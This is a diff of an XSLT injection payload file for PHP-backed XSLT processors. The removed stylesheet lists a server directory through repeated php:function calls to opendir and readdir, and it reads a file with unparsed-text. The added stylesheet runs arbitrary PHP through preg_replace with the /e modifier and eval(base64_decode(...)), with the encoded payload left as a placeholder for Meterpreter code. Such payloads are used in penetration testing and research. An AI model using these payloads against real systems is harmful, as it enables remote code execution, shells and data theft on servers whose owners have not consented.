@@ -1,25 +1,8 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
-<body>
-<xsl:value-of select="php:function('opendir','.')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="unparsed-text('Resource')"/>
-</body>
-</html> 
-
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
+         <xsl:template match="/">
+                 <xsl:variable name="eval">
+                         eval(base64_decode('Base64-encoded Meterpreter code'))
+                 </xsl:variable>
+                 <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
+         </xsl:template>
+ </xsl:stylesheet>
